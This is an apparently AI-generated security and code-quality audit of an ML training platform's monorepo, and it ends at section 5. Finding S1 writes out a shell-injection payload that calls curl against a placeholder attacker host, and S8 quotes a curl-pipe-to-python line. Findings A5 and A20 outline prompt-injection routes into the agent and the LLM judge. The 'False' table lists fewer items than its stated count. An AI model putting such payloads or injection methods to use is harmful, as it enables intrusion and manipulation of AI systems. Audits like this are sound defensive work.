# Amortized Monorepo: Comprehensive Deep Scan

_Generated 2026-07-24 — 9 parallel analysis agents across security, backend, frontend, AI/LLM, integration, infrastructure, data model, testing, and duplication._

_Verified 2026-07-27 — 9 verification agents checked ALL 216 findings against actual code. Results: **191 CONFIRMED (88.4%), 20 PARTIALLY TRUE (9.3%), 5 FALSE (2.3%)**._

---

## Verification Summary

Every finding was independently verified by an agent that read the exact file and line cited. Each received a verdict:

| Category | Checked | Confirmed | Partially True | False |
|----------|---------|-----------|----------------|-------|
| Security (S1-S24) | 24 | 21 | 3 | 0 |
| Infrastructure (K1-K23) | 23 | 21 | 2 | 0 |
| Backend (B1-B47) | 47 | 45 | 2 | 0 |
| AI/LLM & Agent (A1-A29) | 29 | 24 | 5 | 0 |
| Frontend (F1-F42) | 42 | 35 | 4 | 3 |
| Integration (I1-I12) | 12 | 12 | 0 | 0 |
| Data Model (D1-D20) | 20 | 17 | 3 | 0 |
| Dead Code & Duplication (X1-X26) | 26 | 22 | 4 | 0 |
| **Total** | **216** | **191** | **20** | **5** |

### Partially True (20 findings — issue exists but description was overstated or nuanced)

| Finding | Nuance |
|---------|--------|
| S4 | Auth defaults off is true. `/mcp` IS protected when auth is on (correct behavior). Real issue is only that auth defaults to off. |
| S9 | SSRF protection exists (blocked hostnames, private IP ranges, internal DNS suffixes) but bypassable via DNS rebinding and redirect chains. |
| S24 | Filter injection pattern exists but `name` originates from API response, not free-form user input. Low practical risk. |
| K7 | `amortized-s3` secret is referenced in base but defined in dev overlay. Base alone would fail, but deployed overlays include it. |
| K15 | CI builds and pushes images but has no CD steps. Deployment is manual. Described as "no deployment pipeline" which is accurate for CD but misleading since CI exists. |
| B24 | MLflow failure is logged as a warning, not truly "silent." But downstream effect (job proceeds with wrong/missing data) is real. |
| B42 | Code path for unknown job types exists but `JobType` enum validation at API layer prevents it. Only reachable via direct DB insertion. |
| A14 | Extraction template IS circular (LLM generates text then extracts from it), but this is standard practice in synthetic data generation (teacher-student distillation). By design, not a bug. |
| A16 | Two eval template field names exist but `_build_judge_config` intentionally translates between them. Deliberate schema translation, not a bug. |
| A20 | Judge prompt injection via `[BEGIN DATA]`/`[END DATA]` delimiters is a real risk but standard pattern in LLM-as-judge systems (RAGAS, Prometheus). |
| A22 | MCP tool descriptions are auto-generated from FastAPI summaries. Functional but not optimized for LLM consumption. "Too terse" is overstated — some endpoints have good summaries. |
| F5 | Optimistic cancel writes to wrong cache key so UI doesn't update immediately, but `onSettled` invalidation triggers refetch. Broken UX, not broken functionality. |
| F7 | `new Date(startedAt).getTime()` can return NaN for malformed strings, but `null` is guarded. Only an issue with non-null invalid date strings. |
| F19 | Inline arrow in `onSend` is real. But `messages` in `useCallback` deps for `handleOptionSelect` is legitimate since the callback reads it. |
| F39 | No local ErrorBoundary around lazy `JsonEditorInner`, but route-level ErrorBoundary exists. Load failure takes down whole page, not whole app. |
| X12 | `express` and `cors` used in `mock-backend.js` (dev tooling). `react-dropzone`, `vaul`, `@base-ui/react` genuinely unused. 3 of 5 deps truly dead. |
| X16 | 12 `httpx.AsyncClient` instances, not 13+. Several are for docling/URL downloads, not MLflow. Core issue (no shared client) is valid. |
| X19 | Log retrieval structure is duplicated between local and SSH backends, but I/O mechanisms necessarily differ. Structural duplication inherent to two transport backends. |
| D6 | `documents` table and repository methods ARE dead (API bypasses them via MLflow). But the documents API endpoints themselves are alive. |
| D19 | `_secrets` key structure is visible in API responses, but values ARE redacted by recursive `redact_config`. Only custom key names not in `_REDACT_FIELDS` would leak values. |

### False (5 findings — claim was wrong or code is actually correct)

| Finding | Reality |
|---------|---------|
| X3 | Original claim said "documents API calls Repository methods" — it does not. Table and methods are dead, but characterization was incorrect. (D6 captures the correct version.) |
| F10 | `handleSaveAs` was claimed to read stale state, but it actually uses `newName` directly in the mutation payload, not `config.name`. The code is correct by design. |
| F26 | `ActiveJobsBadge` was claimed to cause "duplicate API calls" but it uses `useJobs({ status: "running" })` — a legitimately different filtered query, not a duplicate. |

---

## Table of Contents

1. [Security](#1-security)
2. [AI/LLM & Agent](#2-aillm--agent)
3. [Backend Architecture & Bugs](#3-backend-architecture--bugs)
4. [Frontend Architecture & Bugs](#4-frontend-architecture--bugs)
5. [Backend-Frontend Integration](#5-backend-frontend-integration)
6. [Data Model & Schema](#6-data-model--schema)
7. [Infrastructure & DevOps](#7-infrastructure--devops)
8. [Testing](#8-testing)
9. [Duplication & Dead Code](#9-duplication--dead-code)
10. [Priority Summary](#10-priority-summary)

---

## 1. Security

### Critical

| # | Issue | Location |
|---|-------|----------|
| S1 | **Shell injection via S3 download URIs in K8s init containers** — user-supplied `data_path` flows into `S3Download.s3_uri` and is interpolated directly into a `sh -c` command string with no shell escaping. A payload like `s3://bucket/$(curl attacker.com).jsonl` executes arbitrary commands. | `backends/kubernetes.py:283-295` |
| S2 | **SSH heredoc injection** — config file content written via heredoc with fixed delimiter `AMORTIZED_EOF`. If content contains that string on its own line, the heredoc terminates early and subsequent text executes as shell commands on the remote GPU node. | `backends/ssh.py:103-109` |
| S3 | **SSH host key verification disabled** — `known_hosts=None` disables all host key checking, enabling MITM attacks on every SSH connection to GPU nodes that receive secrets. | `backends/ssh.py:59` |
| S4 | **Authentication disabled by default** — `api_key` defaults to empty string; K8s ConfigMap doesn't set it. All endpoints are completely open. When auth IS enabled, `/mcp` is not in `_AUTH_SKIP_PATHS`, breaking the agent's MCP calls (catch-22). | `config.py:16`, `main.py:142,147-148` |
| S5 | **Hardcoded MinIO credentials committed to Git** — `minioadmin/minioadmin` in plaintext `stringData` across 10+ Secret manifests. | `k8s/overlays/dev/s3-secret*.yaml`, all user overlay `s3-secrets.yaml` |
| S6 | **MLflow fully exposed, security disabled** — `--allowed-hosts *`, `MLFLOW_SERVER_DISABLE_SECURITY_MIDDLEWARE: "true"`, exposed via NodePort 31082. Full unauthenticated read/write/delete to all experiments and artifacts. | `k8s/overlays/dev/mlflow.yaml:39-46` |
| S7 | **No NetworkPolicies anywhere** — zero NetworkPolicy resources across entire `k8s/` directory. Every pod can reach every other pod. A compromised training container has unrestricted access to MLflow, MinIO, the server, and all developer environments. | Entire `k8s/` |
| S8 | **Training container supply chain risks** — `curl -sS https://bootstrap.pypa.io/get-pip.py | python3.11` (arbitrary code execution during build, no integrity check). `training-hub @ git+https://github.com/amortized-ai/training_hub.git@main` (mutable branch, code injection by anyone with push access). | `containers/training/Dockerfile:13,35-37` |

### High

| # | Issue | Location |
|---|-------|----------|
| S9 | **DNS rebinding and redirect-based SSRF in document URL conversion** — `_validate_url()` doesn't resolve hostnames to IPs before checking. DNS rebinding + `follow_redirects=True` with 5 redirects bypasses all validation. Docling-serve fetches raw user URL server-side with no validation. | `api/documents.py:57-73,313-382` |
| S10 | **Recipe name path traversal on GET and submit** — `load_recipe()` has no traversal check. `../../etc/cron.d/something.yaml` resolves outside recipes dir. The `extends` field inside recipe YAML enables chained traversal. (`save_recipe` HAS protection; `get_recipe` and `submit_recipe_job` do NOT.) | `core/recipes.py:50-74`, `api/recipes.py:36-41` |
| S11 | **Judge template path traversal** — `load_judge_template(name)` constructs path from user-supplied `judge.template` with no traversal check. | `core/judge_templates.py:24-35` |
| S12 | **Secrets stored unencrypted in SQLite** — `_strip_secrets()` extracts keys but re-embeds them as `stored_config["_secrets"]` in plaintext JSON. `redact_config()` protects API responses, but DB contains all API keys in cleartext. The `_secrets` key structure also leaks in API responses (values are redacted but key names visible). | `core/jobs.py:40-41` |
| S13 | **No auth on agent server** — zero authentication on port 4096. Anyone with cluster network access can send messages to the LLM agent, incurring unlimited API costs. No rate limiting. | `agent/server.py` |
| S14 | **SSH containers use `--network host` and `--ipc=host`** — containers on GPU nodes share the host's network and IPC namespaces. A malicious training script can attack the host network and access shared memory. | `backends/ssh.py:150-153` |
| S15 | **Training container runs as root** — no `USER` directive in runtime stage. Combined with K8s user overlays that set `runAsNonRoot: false`, all jobs run with full root privileges. | `containers/training/Dockerfile`, `k8s/overlays/users/*/kustomization.yaml` |
| S16 | **Dockerfile doesn't use lockfile** — `uv pip install --system --no-cache .` resolves from `pyproject.toml` without `uv.lock`. All runtime deps use unbounded `>=`. Non-reproducible, may pull vulnerable versions. | `Dockerfile` |

### Medium

| # | Issue | Location |
|---|-------|----------|
| S17 | **CORS defaults to wildcard `*`** with `allow_methods=["*"]`, `allow_headers=["*"]`. Combined with disabled auth, any website can make cross-origin requests. | `config.py:17`, `main.py:133-139` |
| S18 | **API key stored in browser localStorage** as plaintext. Any XSS leaks it. Session IDs also persisted. | `studio/src/stores/settings-store.ts:9,24-26` |
| S19 | **Secret stripping only checks top-level keys** — nested secrets like `judge.api_key` stored unredacted. Sensitive key sets defined inconsistently in 3 places (`redact.py:8`, `jobs.py:48`, `worker.py:434`). | Multiple files |
| S20 | **`extra = "allow"` on config models** — `TrainingJobConfig` and `EvalJobConfig` accept arbitrary extra fields. Attackers can inject fields meaningful to downstream tools that bypass validation. | `models.py:38-39,80-81` |
| S21 | **No security headers** — no CSP, X-Frame-Options, X-Content-Type-Options, HSTS, or Referrer-Policy. App can be iframed (clickjacking). | `main.py`, `studio/index.html` |
| S22 | **User-controlled `api_base` and `model_endpoint`** passed to containers without validation. Containers can be directed to fetch from internal services or cloud metadata endpoints. | `models.py:66`, `config_translator.py:114-118` |
| S23 | **Shared MLflow with no tenant isolation** — all users share one MLflow instance. Everyone sees everyone's experiments, runs, and artifacts. No RBAC or user isolation (`X-Forwarded-User` never set by nginx). | K8s overlays, `api/jobs.py:106` |
| S24 | **MLflow filter injection** — frontend interpolates `decodeURIComponent(useParams().id)` directly into MLflow filter string without escaping. | `studio/src/features/models/api/use-models.ts:44` |

---

## 2. AI/LLM & Agent

### Prompt & Agent Architecture

| # | Issue | Location |
|---|-------|----------|
| A1 | **Combined/K8s prompt is stale** — diverges from modular sources. Missing the `<phase>` tagging system that frontend needs for progress tracking. Missing "direct sub-skill routing" logic. Deployed agent won't emit phase tags. | `k8s/base/morty-prompt.md` vs `agent/prompts/*.md` |
| A2 | **Prompt file load ordering bug** — `sorted(glob("*.md"))` produces alphabetical: capabilities, identity, workflow. Identity should come first to anchor persona. | `agent/server.py:77` |
| A3 | **Tool permissions overly broad** — `allowed_tools=["mcp__*"]` grants access to every tool on every MCP server, including `save_recipe` which can overwrite template files. | `agent/server.py:151` |
| A4 | **Anti-resubmission guard too rigid** — "NEVER call `submit_recipe_job` more than once per conversation." If a job fails due to config error, user cannot retry in same conversation. | `workflow.md:72` |
| A5 | **No prompt injection defenses** — no instructions to refuse system prompt extraction or instruction override. `task_description` flows into teacher model prompts via SDG config (indirect injection path). | Agent prompts |
| A6 | **3 placeholder skill guides** — extraction (7 lines), summarization (5 lines), QLoRA (10 lines) mean the agent has no real expertise for 3 of its advertised capabilities. | `agents/sdg/skills/extraction/`, `summarization/`, `agents/training/skills/qlora/` |
| A7 | **Session management unbounded** — sessions stored in plain dict persisted to JSON. No expiry, no cleanup, no max count. | `agent/server.py:59-61` |
| A8 | **No timeout on `query()` call** — can hang indefinitely. Nginx has 300s proxy timeout but FastAPI handler has none. No concurrency control on same-session messages. | `agent/server.py:132` |
| A9 | **Missing `/agent/title` endpoint** — frontend calls it for chat title generation; agent server doesn't implement it. Always falls back to message truncation. | `api-client.ts:307-316` vs `agent/server.py` |
| A10 | **MLflow MCP sidecar missing** — `MCP_MLFLOW_URL` points to `127.0.0.1:5002` but no container listens there. Agent fails whenever it tries to use MLflow MCP tools. | `claude-code-deployment.yaml:69` |

### SDG Pipeline

| # | Issue | Location |
|---|-------|----------|
| A11 | **4 SDG templates use `conversation` instead of `messages` column** — breaks TRL training silently (documented in CLAUDE.md gotchas). Affected: `instruction-following.yaml:169`, `domain-qa.yaml:157`, `dynamic-few-shot.yaml:60`, `data-augmentation.yaml:159`. | `templates/sdg/` |
| A12 | **Auto-generated `strategy_params` uses fragile greedy regex** — `(?s)\[.*\]` matches first `[` to last `]`. Any brackets in explanatory text break extraction. On failure, output is silently empty. | `config_translator.py:163` |
| A13 | **No SDG output validation** — nothing checks output file exists, has expected schema, or produced requested sample count. Silent success on partial/malformed data. | Worker SDG path |
| A14 | **Extraction template is circular** — generates source text then asks same LLM to extract entities from its own text. LLM always "succeeds", producing unrealistically easy training data. | `templates/sdg/extraction.yaml:58-76` |
| A15 | **Auto-generated scenarios are too generic** — always exactly 3 scenarios: "typical", "edge_case", "ambiguous". Task-agnostic, produces low-diversity data. | `config_translator.py:128-140` |

### Eval Pipeline

| # | Issue | Location |
|---|-------|----------|
| A16 | **Two incompatible eval template schemas** — Schema A (`config.judge.prompt`) and Schema B (`judge_params.prompt_template`). `_resolve_judge_template()` handles Schema A only. 7 templates using Schema B get silently empty prompts. | `config_translator.py:181-208`, `templates/eval/` |
| A17 | **Eval preprocessing only triggers for `{request}`/`{response}`** — templates using `{context}`, `{question}`, `{answer}`, `{expected}` won't trigger preprocessing. Judge receives literal `{context}` strings. | `worker.py:517` |
| A18 | **Eval response fallback is dangerous** — when no recognized response field exists, ALL remaining string fields are concatenated as `"key: value\n"`. Arbitrary metadata becomes the "response" for judge evaluation. | `worker.py:102-108` |
| A19 | **Eval results not read back** — worker only checks exit code. Results go to `/amortized/work/eval_results.json` inside the container. Without MLflow, results are lost when pod is cleaned up. | `worker.py:592` |
| A20 | **Judge prompt injection risk** — `[BEGIN DATA]`/`[END DATA]` delimiters are trivially reproducible. Adversarial model output can break out and manipulate evaluation scores. | All 15 LLM judge templates |
| A21 | **`format-compliance.yaml` uses unresolvable placeholders** — `{format_description}`, `{response_keys}`, etc. with no defaults or validation. | `templates/eval/format-compliance.yaml` |

### MCP Tools

| # | Issue | Location |
|---|-------|----------|
| A22 | **Tool descriptions too terse** — auto-generated from function names ("Health", "Create Job"). LLMs can't make informed tool-use decisions. | `mcp/server.py` |
| A23 | **`describe_full_response_schema=True` wastes tokens** — inflates every tool listing with full JSON schemas. `Job` model alone has 13 fields with nested dicts. | `mcp/server.py:31-32` |
| A24 | **`convert_document` (file upload) cannot work over MCP** — accepts `UploadFile` (multipart) but MCP tools are JSON-only. Appears in manifest but always fails. | `documents.py:226` |
| A25 | **Missing tools** — no schema introspection (what fields do configs accept?), no `list_sdg_templates`, no `get_job_chain` for viewing SDG→Training→Eval chain. | |

### Cost Estimation

| # | Issue | Location |
|---|-------|----------|
| A26 | **Token-per-sample constants can be 5-10x off** — `INPUT_TOKENS_PER_SAMPLE = 500`, `OUTPUT_TOKENS_PER_SAMPLE = 300`. No adjustment for task type. Classification might use 100 tokens; conversation 2000+. | `costs.py:52-58` |
| A27 | **Training time estimation ignores real-world overhead** — assumes every sample uses exactly `max_seq_len` tokens. Ignores model loading, checkpointing, eval steps, GPU warmup. | `costs.py:175-182` |
| A28 | **L4 GPU priced but never selected** — `_pick_gpu()` always picks A10G ($1.10/hr) for 16-24GB range, never L4 ($0.81/hr). | `costs.py:164-170` |
| A29 | **Model pricing hardcoded and will go stale** — `claude-haiku-4-5-20251001`, `claude-sonnet-4-20250514`. Need manual maintenance. | `costs.py:22-29` |

---

## 3. Backend Architecture & Bugs

### Architecture

| # | Issue | Location |
|---|-------|----------|
| B1 | **Single-threaded worker with head-of-line blocking** — one job at a time. A multi-hour training job blocks all queued SDG/eval jobs. Worker is a single `asyncio.Task` that polls, picks, runs to completion, then picks next. | `worker.py:686-701` |
| B2 | **Non-atomic job pickup (TOCTOU race)** — `SELECT ... WHERE status = 'queued' LIMIT 1` without atomically claiming. Status updated to "provisioning" later at line 567, after backend is already called. Two workers = duplicate dispatch. Crash between pick and update = stuck job. | `db/repository.py:119-127` |
| B3 | **`provisioning` is a dead zone** — `cleanup_orphaned_jobs()` only recovers `running` jobs, not `provisioning`. Crash after `submit()` but before first `status()` = job stuck forever. | `worker.py:655-683` |
| B4 | **No status transition enforcement** — no state machine. `update_job` accepts any status for any current state. Nothing prevents `succeeded`→`running`. | `db/repository.py:94` |
| B5 | **No job timeout enforcement** — `JobSpec.timeout` field exists but no backend reads or enforces it. Stuck jobs run forever. | `backends/__init__.py:60` |
| B6 | **SQLite on a RWO PVC** — single global `aiosqlite.Connection` shared between API and worker. Fundamentally prevents horizontal scaling. | `db/connection.py:22-29`, `server-pvc.yaml` |
| B7 | **No migration system** — schema is `CREATE TABLE IF NOT EXISTS`. No Alembic, no version tracking. Adding a column = manual `ALTER TABLE`. | `db/schema.sql` |

### Hardcoded Values

| # | Issue | Location |
|---|-------|----------|
| B8 | **Container images use `:latest`, ignore `image_registry` setting** — `_JOB_TYPE_IMAGES` hardcodes full image paths. `config.py:25` `image_registry` is dead config. Non-reproducible, stale cached images. | `worker.py:27-30` |
| B9 | **Init container image hardcoded** — `docker.io/amazon/aws-cli:latest`. Unreachable in air-gapped environments. | `kubernetes.py:287` |
| B10 | **K8s assumptions hardcoded** — `/dev/shm` volume `12Gi` (not configurable, can cause pod eviction), `nvidia.com/gpu.present=true` node selector (won't work on AMD/Intel), `ttl_seconds_after_finished=3600` (not configurable). | `kubernetes.py:163,273-274,370` |
| B11 | **Container-internal paths as magic strings** — `/amortized/work/output`, `/amortized/config.yaml`, etc. scattered through `worker.py` at lines 133,138,398,452,483,490,496,511. | `worker.py` |
| B12 | **Training defaults undocumented** — `batch * 4` for `effective_batch_size`, `2048` for `max_seq_len`, `60000` for `max_batch_len`, `2e-5` for `learning_rate`. | `worker.py:141-150` |
| B13 | **Default model IDs will rot** — `openai/gpt-4o-mini` hardcoded for SDG and eval judge defaults. | `config_translator.py:109,215` |
| B14 | **Relative `db_path` and `data_dir`** — `Path("./data/amortized.db")` resolves relative to CWD. | `config.py:12-13` |
| B15 | **S3 bucket env var mismatch** — configmap sets `AMORTIZED_S3_BUCKET`, code reads `AMORTIZED_STORAGE_BUCKET`. Configmap value is dead. Works only because fallback default matches. | `configmap.yaml:19`, `config.py` |

### Brittle Patterns

| # | Issue | Location |
|---|-------|----------|
| B16 | **MLflow run ID extracted by regex from container logs** — `re.search(r"/runs/([a-f0-9]{32})", log_text)` on last 200 lines. If log format changes, or ID is on line 201+, or another 32-char hex matches, silently wrong/lost. Sole mechanism for artifact linkage. | `worker.py:210-221` |
| B17 | **SSH `wait` on PID doesn't work across sessions** — `wait {handle.remote_pid}` is a bash builtin that only works on child processes of current shell. In a new SSH session, always returns 127. | `backends/ssh.py:224` |
| B18 | **SSH `--gpus all` is Docker-specific** — doesn't work with podman (needs `--device nvidia.com/gpu=all`). | `backends/ssh.py:153` |
| B19 | **`_row_to_job` patches bad data** — `d.get("error") in ("", "None")` treats literal string `"None"` as null, indicating past bug where `str(None)` was stored. Band-aid on write path bug. | `db/repository.py:158` |
| B20 | **Eval preprocess script checks first row only** — `if "request" in rows[0]` determines behavior for all rows. If first row differs from rest, wrong behavior. | `worker.py:71-73` |
| B21 | **Local backend path replacement is fragile `str.replace` chain** — 4 hardcoded `.replace()` calls. Only rewrites `python3.11`; other Python versions not handled. | `backends/local.py:45-54` |
| B22 | **Cost model label keys inconsistent with pricing keys** — `MODEL_LABELS` uses `@`-separated keys with no corresponding `MODEL_PRICING` entry. Wrong fallback pricing. | `costs.py:31-39` vs `22-29` |
| B23 | **`_EVAL_PREPROCESS_SCRIPT` as 57-line string literal** — entire Python script embedded as multiline string, written to file at dispatch time. | `worker.py:60-117` |

### Error Handling Gaps

| # | Issue | Location |
|---|-------|----------|
| B24 | **MLflow failure = silent data loss** — `_resolve_mlflow_artifact_uri` returns `""` on any exception. Parent job chaining silently breaks. Training job runs without data. Model registration fails. Job still "succeeds". | `worker.py:192-207` |
| B25 | **K8s log streaming exceptions fully swallowed** — `except Exception: pass`. Caller gets truncated stream with no indication. | `kubernetes.py:500-501` |
| B26 | **GCP secret check hides real errors** — `except Exception: return False`. RBAC denied, timeouts, malformed responses all treated as "secret doesn't exist." | `kubernetes.py:65-69` |
| B27 | **Gateway model error cached for 60s** — empty list cached for full TTL on transient failure. | `api/models.py:49-53` |
| B28 | **`cancel_job_via_backend` swallows without logging** — `except (KeyError, OSError): return False`. | `core/jobs.py:124` |
| B29 | **`update_job` doesn't JSON-serialize dicts** — passes raw dict as SQL parameter. SQLite stores Python repr instead of JSON. | `db/repository.py:105-113` |
| B30 | **Artifact proxy reads entire S3 object into memory** — `obj["Body"].read()` with no size limit. Multi-GB checkpoint = OOM. | `api/artifacts.py:81` |
| B31 | **File upload read before size check** — `await file.read()` consumes all memory before 100MB limit check. | `api/documents.py:241,245` |

### Resource Leaks

| # | Issue | Location |
|---|-------|----------|
| B32 | **Local backend file handle leak** — stdout/stderr `open()` never closed. `noqa: SIM115` acknowledges it. FDs accumulate over jobs. | `backends/local.py:59-60` |
| B33 | **Local backend `_processes` dict grows unboundedly** — completed processes never removed (except on `cancel`). Accumulates Popen objects. | `backends/local.py:29,84` |
| B34 | **K8s `ApiClient` never closed** — holds `aiohttp.ClientSession`, leaks HTTP connection pool. | `kubernetes.py:50-57` |
| B35 | **SSH opens new connection per operation** — each `submit`/`status`/`cancel`/`logs` opens and closes SSH. Status polling every 2s = enormous SSH overhead. | `backends/ssh.py` |
| B36 | **New `httpx.AsyncClient` per MLflow call** — new TCP connection, TLS handshake each time. 4+ per job. | `worker.py:192-195,229-232,273` |
| B37 | **New boto3 S3 client per request** | `api/artifacts.py:35-53` |
| B38 | **`_get_shared_db` has TOCTOU race** — two coroutines can both see `_shared_db is None` and create separate connections. First is leaked. Needs `asyncio.Lock`. | `db/connection.py:22-29` |
| B39 | **`_get_client()` in K8s backend same race** — two coroutines create two `ApiClient` instances. One leaked. | `kubernetes.py:50-57` |

### Missing Validation

| # | Issue | Location |
|---|-------|----------|
| B40 | **`algorithm` accepts any string** — only `sft`, `lora_sft`, `osft`, `dpo`, `grpo`, etc. are valid. Invalid algorithms pass API validation and fail deep in worker. | `models.py:42` |
| B41 | **Dead capability check** — `required_caps: set[Capability] = set()` is always empty. GPU capability never validated. | `worker.py:415-416` |
| B42 | **No image for unknown job types = empty command** — `_JOB_TYPE_IMAGES.get()` returns `None`, `cmd` stays empty list. Cryptic backend error. | `worker.py:467` |
| B43 | **`EvalJobConfig.dataset` required but worker treats it as optional** — users must pass `dataset=""` to satisfy validation when using `dataset_job_id`. | `models.py:83`, `worker.py:498-509` |
| B44 | **No training data format validation** — DPO needs `chosen`/`rejected`, KTO needs `label`, GEPA needs `input`/`answer`. Never checked programmatically. Failures surface as cryptic container crashes. | |
| B45 | **Silent fallback for unknown model IDs in cost estimation** — uses smallest model's parameters. Estimates look valid but are wrong. | `costs.py:123,178,544` |
| B46 | **`num_samples` allows zero** — potential division by zero in cost estimation. | `costs.py:271,311,374` |
| B47 | **Recipe `compute` section silently ignored** — `config["compute"]` exists after flattening but worker never reads it. GPU count hardcoded to 1. | `worker.py:545` |

---

## 4. Frontend Architecture & Bugs

### Bugs

| # | Issue | Location |
|---|-------|----------|
| F1 | **`visibleToolResults` useMemo missing deps** — reads `trainingCostSummary` and `evalCostSummary` inside body but they're not in dependency array. Returns stale data when those change. | `message-bubble.tsx:314-340` |
| F2 | **ChatPanel missing `__nav:` routing** — full-page `ChatPage` checks for `__nav:` prefix but slide-out `ChatPanel` doesn't. Clicking "View Job" in panel sends `__nav:/jobs?job=...` as literal chat message. | `chat-panel.tsx:37-47` |
| F3 | **`||` vs `??` for numeric values** — `epoch` or `learning_rate` of `0` is falsy and gets skipped. | `model-detail.tsx:115-117` |
| F4 | **`Math.round` produces "1h 60m"** — `Math.round(59.5) = 60`. Should be `Math.floor`. | `models/lib/format.ts:5` |
| F5 | **Optimistic cancel targets wrong query key** — updates `["jobs"]` but active queries use `["jobs", filters, pagination]`. Optimistic update never applies. | `use-jobs.ts:51-58` |
| F6 | **`useState(defaultName)` captures initial value only** — save dialog shows stale name if `defaultName` changes. | `save-dialog.tsx:26` |
| F7 | **`new Date(startedAt).getTime()` can return NaN** — invalid date strings produce `"NaNs"` display. | `jobs/lib/format.ts:7-8` |
| F8 | **SVG gradient ID collision** — `"fillTraining"` and `"fillEvaluation"` globally scoped. Two chart instances = gradient collision. | `overview-chart.tsx:113-121` |
| F9 | **Skeleton column count mismatch** — `TableSkeleton columns={5}` but `ModelTable` has 4 columns. | `models/page.tsx:84` |
| F10 | **`handleSaveAs` reads stale state** — `setField` dispatches update, then `getConfig()` reads old state. | `recipes/page.tsx:180-193` |
| F11 | **MonitorDismissed state lost on re-mount** — dismiss state and completion status are local. Conversation switch = monitor restarts for completed jobs. | `message-bubble.tsx:173-174` |
| F12 | **`JobMonitorCard` uses `<a href>` instead of React Router `<Link>`** — causes full page reloads in SPA. | `job-monitor-card.tsx:219-248` |
| F13 | **Module-level `activeConversationId` race condition** — switching conversations during in-flight message = response attributed to wrong conversation. | `api-client.ts:184` |
| F14 | **`request()` returns `undefined as T` for empty responses** — type-safety hole. Runtime crashes on `.` access. | `api-client.ts:84` |

### Performance

| # | Issue | Location |
|---|-------|----------|
| F15 | **MessageBubble re-renders on every streaming token (O(n) per token)** — no `React.memo` anywhere in codebase. `allMessages` is new array ref on every parent render. | `message-list.tsx:37-45` |
| F16 | **No abort signals on any API call** — no `AbortController` anywhere. Hung requests leave chat permanently in "streaming" state. Can't cancel on unmount/navigation. | `api-client.ts:49-86` |
| F17 | **6 of 8 pages eagerly loaded** — only `OverviewPage` and `RecipesPage` are lazy-loaded. `ChatPage` pulls `react-markdown` + `remark-gfm` (~100KB+). | `router.tsx:7-14` |
| F18 | **`useModelJobs` fetches ALL jobs then filters client-side** — `getJobs()` fetches every job then filters by `mlflow_run_id`. Server-side filter would be far more efficient. | `use-models.ts:135` |
| F19 | **Unstable callback references cause cascading re-renders** — inline arrow functions in JSX, `messages` in `useCallback` deps, `executeMutation` object (not `.mutate`) in deps. | `chat/page.tsx:72,45-59`, `recipes/page.tsx:166,178,194` |
| F20 | **CodeMirror extensions array recreated every render** — `[json(), linter(jsonParseLinter())]` on each render triggers full reconfiguration. | `json-editor-inner.tsx:78` |
| F21 | **No `manualChunks` configured** — recharts, react-markdown, codemirror all in initial bundle. `import * as RechartsPrimitive` prevents tree-shaking. | `vite.config.ts`, `chart.tsx:2` |

### State Management

| # | Issue | Location |
|---|-------|----------|
| F22 | **Chat state grows unboundedly in localStorage** — all messages including large tool results persisted with no eviction. Will hit ~5MB limit. `entity-names-store` also grows forever. | `chat-store.ts:144`, `entity-names-store.ts` |
| F23 | **State duplicated between useState and Zustand** — messages in both local `useState` and persisted store. Two writes per message. Can drift if either fails. | `use-chat.ts:117-119,180,219-239` |
| F24 | **Duplicate health hooks with conflicting retry** — `use-settings.ts` and `use-system-health.ts` share query key `["health"]` but fight over retry behavior. | |
| F25 | **Double-toast on cancel failures** — global mutation handler + `useCancelJob.onError` both toast. | `providers.tsx:9`, `use-jobs.ts:69` |
| F26 | **`ActiveJobsBadge` causes duplicate API calls** — separate polling query with different cache key from main jobs query. | `active-jobs-badge.tsx` |
| F27 | **Agent endpoints bypass API client** — raw `fetch()` for `/agent/*` skips auth headers, request IDs, structured error handling. `useProviderStatus` also uses raw fetch without `getBaseUrl()`. | `api-client.ts:191-199,242`, `use-providers.ts:13` |

### Accessibility

| # | Issue | Location |
|---|-------|----------|
| F28 | **Missing aria-labels** on dismiss buttons, expand/collapse controls, progress bars, filter chips (need `aria-pressed`). | `session-status-banner.tsx:26`, `plan-progress.tsx:63`, `job-monitor-card.tsx:191-203`, `filter-chips.tsx:98-109` |
| F29 | **Labels not associated with inputs** in recipe builder — `FieldLabel` wraps `Label` but no `htmlFor`. | `recipe-builder-form.tsx:81,112,...` |
| F30 | **Clickable table rows have no keyboard support** — no `tabIndex`, `role`, or `onKeyDown`. | `recent-jobs.tsx:84-87` |
| F31 | **Conversation rename is double-click only** — undiscoverable for keyboard users. | `conversation-list.tsx:116` |
| F32 | **Missing `DialogDescription`** on job detail and JSON editor dialogs. | `job-detail-panel.tsx:76`, `json-editor-dialog.tsx` |
| F33 | **Empty column header** for actions column — screen readers can't identify it. | `document-table.tsx:72` |
| F34 | **`learning_rate` placeholder encourages YAML gotcha** — `"2e-5"` which `yaml.safe_load()` parses as string. Should show `"0.00002"`. | `recipe-builder-form.tsx:165` |

### Missing Error Handling

| # | Issue | Location |
|---|-------|----------|
| F35 | **No error boundary around individual MessageBubbles** — one bad message crashes entire list. | `message-list.tsx:37-45` |
| F36 | **Multiple queries ignore `isError`** — show "not found" instead of error state. | `model-detail-page.tsx:12`, `dataset-detail.tsx:14` |
| F37 | **Job monitor silently swallows polling failures** — after many consecutive failures, still shows "Monitoring job" with no indication of failure. | `job-monitor-card.tsx:105-107` |
| F38 | **`setTimeout` without cleanup across codebase** — setState on unmounted component. 5+ locations. | `document-detail-panel.tsx:183`, `upload-document-dialog.tsx:72,90`, `job-table.tsx:119` |
| F39 | **No ErrorBoundary around lazy `JsonEditorInner`** — chunk load failure crashes dialog. | `json-editor-dialog.tsx` |
| F40 | **Context replay swallows response** — no check if agent accepted the context on session rebuild. | `api-client.ts:268-279` |
| F41 | **`confirmAction`/`rejectAction` are no-ops** — render functional-looking buttons that do nothing. | `use-chat.ts:272-273` |
| F42 | **Chat errors invisible in slide-out panel** — `ChatPanel` doesn't read `error` state from `useChat`. | `chat-panel.tsx` |

---

## 5. Backend-Frontend Integration

### Type Mismatches

| # | Issue | Frontend | Backend |
|---|-------|----------|---------|
| I1 | **`Job.metadata` doesn't exist** — always undefined | `types/api.ts:16` | `models.py:96-111` (no field) |
| I2 | **`Recipe` expects `version`, `schema`, `defaults`** — none exist | `types/api.ts:46-53` | `models.py:114-118` |
| I3 | **Pagination params silently ignored** — FE sends `page`, `per_page`, `sort`, `order`; BE only reads `status`, `type` | `api-client.ts:125-133` | `api/jobs.py:124-132` |
